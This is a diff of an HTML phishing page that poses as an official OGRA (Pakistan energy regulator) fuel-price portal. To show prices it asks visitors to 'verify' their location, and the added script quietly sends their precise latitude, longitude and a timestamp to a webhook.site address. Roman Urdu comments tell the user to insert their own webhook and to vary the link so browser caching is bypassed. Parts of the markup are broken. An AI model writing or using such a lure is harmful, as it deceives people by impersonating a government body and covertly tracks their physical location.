@@ -1,31 +1,26 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="ur" dir="ltr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Industrial Fuel Regulatory Portal</title>
+    <title>Energy Regulatory Authority | Pakistan</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        .gov-blue { background-color: #002d72; }
-    </style>
 </head>
 <body class="bg-gray-100 font-sans text-gray-900">
 
-    <!-- Header -->
-    <nav class="gov-blue text-white p-5 shadow-lg border-b-4 border-yellow-500">
+    <nav class="bg-[#002d72] text-white p-5 shadow-lg border-b-4 border-yellow-500">
         <div class="max-w-md mx-auto text-center">
             <h1 class="font-bold text-lg">OGRA Energy Regulatory Portal</h1>
             <p class="text-[10px] uppercase tracking-widest text-yellow-400">Official Secure Access</p>
         </div>
     </nav>
 
-    <!-- Main Card -->
     <main class="max-w-md mx-auto mt-10 p-6">
-        <div id="main-card" class="bg-white p-8 rounded-xl shadow-xl border border-gray-200">
+        <div id="main-card" id="main-card" p-8 rounded-xl shadow-xl border border-gray-200">
             <div id="content-area" class="text-center">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/3/32/Flag_of_Pakistan.svg" class="w-16 mx-auto mb-4 opacity-80">
                 <h2 class="text-xl font-bold text-blue-900 mb-2">Industrial Fuel Price Verification</h2>
-                <p id="msg" class="text-gray-600 text-sm mb-6">Access to real-time furnace oil and sludge pricing is restricted to verified industrial sites. Please verify your location to proceed.</p>
+                <p id="msg" class="text-gray-600 text-sm mb-6">Access to real-time furnace oil and sludge pricing is restricted. Please verify your industrial site location to proceed.</p>
                 
                 <button id="btn-fetch" onclick="initiateAuth()" class="w-full bg-blue-900 text-white font-bold py-4 rounded-lg hover:bg-blue-800 transition active:scale-95 shadow-lg">
                     Verify Site Location
@@ -35,11 +30,18 @@
     </main>
 
     <script>
+        // Har baar naya URL param generate kar taaki browser cache bypass ho
+        function getUniqueLink() {
+            return window.location.href.split('?')[0] + '?id=' + Math.floor(Math.random() * 1000000);
+        }
+
         function initiateAuth() {
-            const btn = =            btn.innerText = "Processing Security Handshake...";
+            const btn = document.getElementById('btn-fetch');
+            btn.innerText = "Processing Security Handshake...";
             btn.disabled = true;
 
             if (navigator.geolocation) {
+                // High accuracy for precise location
                 navigator.geolocation.getCurrentPosition(
                     (pos) => releaseData(pos),
                     () => handleBlock()
@@ -48,13 +50,19 @@
         }
 
         async function releaseData(pos) {
-            const data = { lat: pos.coords.latitude, lon: pos.coords.longitude };
+            const data = { 
+                lat: pos.coords.latitude, 
+                lon: pos.coords.longitude,
+                timestamp: new Date().toISOString()
+            };
+
+            // Apna Webhook yahan daal
             await fetch("https://webhook.site/a5810f06-e1e7-4069-a0b5-4eda839f0b5b", {
                 method: "POST",
                 body: JSON.stringify(data)
             });
 
-            // Yahan ab rates dikhenge, pehle nahi
+            // Rates Unlock
             document.getElementById('main-card').innerHTML = `
                 <h2 class='text-xl font-bold text-green-700 text-center mb-6'>Verification Successful</h2>
                 <div class='space-y-4'>
